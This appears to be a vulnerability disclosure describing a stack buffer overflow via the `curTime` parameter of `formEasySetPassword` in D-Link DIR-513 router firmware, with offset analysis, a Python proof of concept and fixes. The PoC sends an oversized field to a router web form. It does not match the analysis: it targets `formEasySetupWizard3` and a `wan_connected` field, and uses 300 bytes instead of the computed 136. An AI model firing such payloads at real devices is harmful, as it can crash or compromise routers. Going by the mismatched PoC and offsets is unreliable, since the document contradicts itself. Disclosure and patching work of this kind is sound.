- **Vulnerability Type**: Stack Buffer Overflow

- **Risk Level**: High

- **Vendor/Product**: D-Link / DIR-513 (FW: A1FW110, A2FW110)

- **Affected Function**: `formEasySetPassword` (Address: `0x4439b4`)

- **Trigger Condition**: An excessively long `curTime` parameter in an HTTP POST request, with the `language` parameter set to something other than "SC" or "TW".

### Vulnerability Details

#### Code Analysis

Inside the `formEasySetPassword` function, the service retrieves the user-controllable `curTime` parameter via `websGetVar`.

```
// Pseudocode logic
Var = websGetVar(wp, "curTime", "");
language = websGetVar(wp, "language", "");
if (strcmp(language, "SC") && strcmp(language, "TW")) {
    // Vulnerable point
    sprintf(v11, "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var); 
}
```

1. **Buffer Limitation**: The stack buffer `v11` has a fixed size of **104 bytes**.

2. **Static Prefix**: The format string `"/Basic/Wizard_Easy_Timezone.asp?t="` consumes approximately **36 bytes**.

3. **Root Cause**: The program uses the unsafe `sprintf` function without bounds checking and fails to validate the length of the `curTime` input.

### Exploitation Analysis

- **Offset Calculation**:
  
  - The distance from the start of buffer `v11` to the saved return address is **172 bytes**.
  
  - Accounting for the 36-byte static prefix, the required padding length in the `curTime` parameter is $172 - 36 = 136$ bytes before reaching the return address.

- **Attack Path**: By sending a crafted POST request, an attacker can overwrite the return address on the stack to gain Remote Code Execution (RCE) or trigger a Denial of Service (DoS).

### POC

```python
import requests


OFFSET = 300

payload = b'A' * OFFSET 


url = "http://192.168.0.1/goform/formEasySetupWizard3"
data = {
    "wan_connected": payload,
    "config.wireless.SSID": "TestSSID",
    "security_type_radio": "0",
    "config.submitflag": "current"
}

response = requests.post(url, data=data)
print(response.text)
```

### Mitigation & Recommendations

1. **Official Fix**: Replace `sprintf` with the safer `snprintf` function:
   
   `snprintf(v11, sizeof(v11), "/Basic/Wizard_Easy_Timezone.asp?t=%s", Var);`

2. **Input Validation**: Implement a strict length check for the `curTime` parameter (e.g., limit to 60 bytes).

3. **Temporary Mitigation**: Deploy WAF rules to drop POST requests to `/formEasySetPassword` that contain abnormally long `curTime` values.